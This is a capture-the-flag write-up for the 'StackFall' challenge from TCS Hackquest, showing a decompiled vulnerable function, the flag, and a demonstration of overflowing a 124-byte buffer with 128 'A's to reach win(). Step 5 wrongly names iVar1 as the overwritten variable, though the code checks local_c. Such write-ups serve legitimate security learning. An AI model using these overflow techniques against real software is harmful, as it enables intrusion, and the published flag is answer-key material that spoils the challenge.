---
layout: page
title: "StackFall"
major_type: CTF
parent_group: TCS Hackquest S10 Round 1
summary: "Exploit a classic buffer overflow vulnerability to overwrite a variable and execute a win() function."
---

**Flag:** `HQX{8d0b49450b73e60d6237a927f2b8e19b}`

## Approach (Step by Step)

1. After reading the description, it felt like a pwn challenge and more specifically a buffer overflow challenge where excess feeding to a buffer results in overwriting a variable and invoking a function which can be only called by a var > 0 condition branch like if-else.
2. Just inputted a large number of ‘A’s (traditional check) and got the flag:

### Output:

![StackFall Output](/assets/images/writeups/tcs-hackquest/03-stackfall-output.png)

3. But I didn't stop there. After reviewing the source code of the site, I found a vulnerability of information disclosure, hence tried a payload:

```html
<a href="/download/healthcheck">
```

4. Which gave me a link based prompt, after downloading, I found an ELF file not stripped. Analyzing the elf in Ghidra, found the main function, which exactly matched my prediction of a classic buffer overflow. `healthCheck` function results into `win()`:

```c
void healthCheck(void)
{
    int iVar1;
    char local_88 [124];
    int local_c;
    local_c = 0x37393835;
    puts("==================================================================");
    puts(" Health Agent: Archive Node OP-DELTA (brief interactive check)");
    puts("");
    puts(" Type a command and press Enter. Commands: hi, ping, status, help, quit");
    puts(" Any other input will be treated as an exploit payload and proceed.");
    puts(&DAT_00102180);
    puts("==================================================================");
    printf("\nhealth> ");
    iVar1 = __isoc99_scanf("%128s",local_88);
    if (iVar1 == 1) {
        iVar1 = strcmp(local_88,"hi");
        if ((iVar1 != 0) && (iVar1 = strcmp(local_88,"hello"), iVar1 != 0)) {
            iVar1 = strcmp(local_88,"ping");
            if (iVar1 == 0) {
                puts("pong");
                return;
            }
            iVar1 = strcmp(local_88,"status");
            if (iVar1 == 0) {
                puts("OK - archive node nominal");
                return;
            }
            iVar1 = strcmp(local_88,"help");
            if (iVar1 == 0) {
                puts("Commands:");
                puts(" hi / hello");
                puts(" ping");
                puts(" status");
                puts(" quit");
                return;
            }
            iVar1 = strcmp(local_88,"quit");
            if (iVar1 != 0) {
                if (local_c != 0x37393835) {
                    win();
                    return;
                }
                puts(&DAT_00102270);
                return;
            }
            puts("Goodbye.");
            /* WARNING: Subroutine does not return */
            exit(0);
        }
        puts("hello");
    }
    else {
        puts("No input detected. Exiting.");
    }
    return;
}
```

5. We can see the buffer is of size 124 and yet accepts an extra 4 bytes of data (128) through `scanf`. Feeding extra input will definitely overflow the buffer, and hence the `iVar1` variable could be overwritten by the extra input.

### Demonstration:

```bash
┌──(himanshu@Kaaammui)-[~/Desktop/tcs/stack]-(13-12-2025 11:14:33)
└─$ cat > flag.txt
flaggg!
^C
┌──(himanshu@Kaaammui)-[~/Desktop/tcs/stack]-(13-12-2025 11:14:54)
└─$ ./healthcheck
=================================================================
Health Agent: Archive Node OP-DELTA (brief interactive check)
Type a command and press Enter. Commands: hi, ping, status, help, quit
Any other input will be treated as an exploit payload and proceed.
Note: Inputs can be noisy — unexpected behaviour may reveal secrets.
==================================================================
health> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your flag is - flaggg!
```

7. Hence this confirms my approach.
